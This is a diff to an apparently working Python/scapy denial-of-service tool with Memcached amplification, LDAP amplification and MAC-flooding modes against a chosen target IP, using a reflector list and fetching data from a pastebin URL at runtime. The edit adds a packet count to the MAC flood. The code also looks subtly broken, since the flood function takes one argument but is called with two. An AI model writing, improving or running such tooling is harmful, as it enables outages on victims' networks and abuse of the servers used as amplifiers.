@@ -1,9 +1,5 @@
-import pip
-#pip.main(['install', 'scapy'])
-#pip.main(['install', 'datetime'])
-#pip.main(['install', 'nmap'])
 from scapy.all import *
-import threading, sys, datetime, argparse, urllib2
+import datetime, argparse, urllib2
 print("""
 
                       :::!~!!!!!:.
@@ -33,7 +29,6 @@ print(datetime.datetime.now())
 parser = argparse.ArgumentParser()
 parser.add_argument("-A", help="1 - Memcrashed | 2 - LDAP | 3 - MAC Flodding")
 parser.add_argument("-T", help="Target")
-parser.add_argument("-P", default=40, help="Port")
 parser.add_argument("-S", help="File amplification")
 parser.add_argument("-N", default=40, help="Number of packages")
 args = parser.parse_args()
@@ -47,14 +42,14 @@ def sends(data, port):
 
 
 def macflood(target):
-	sendp(Ether(src=RandMAC(), dst=target )/ARP( op=2, psrc="0.0.0.0", hwdst=target)/Padding(load="X"*18))
+	sendp(Ether(src=RandMAC(), dst=target )/ARP(op=2, psrc="0.0.0.0", hwdst=target)/Padding(load="X"*18), count=int(powers))
 
 
 print("""
 
-1. Memcrashed: -A 1 -T xx.xx.xx.xx -S bot.txt -P 40
-2. LDAP: -A 2 -T xx.xx.xx.xx -S bot.txt -P 40
-3. Mac-flood: -A 3 -T xx.xx.xx.xx 
+1. Memcrashed: -A 1 -T xx.xx.xx.xx -S bot.txt -N 40
+2. LDAP: -A 2 -T xx.xx.xx.xx -S bot.txt -N 40
+3. Mac-flood: -A 3 -N xx.xx.xx.xx 
 
 	""")
 req = urllib2.urlopen('https://pastebin.com/raw/eSCHTTVu')
@@ -86,4 +81,4 @@ elif(attack == '1'):
 elif(attack == '2'):
 	sends(ldap, 31337)
 elif(attack == '3'):
-	macflood(target)
+	macflood(target, powers)
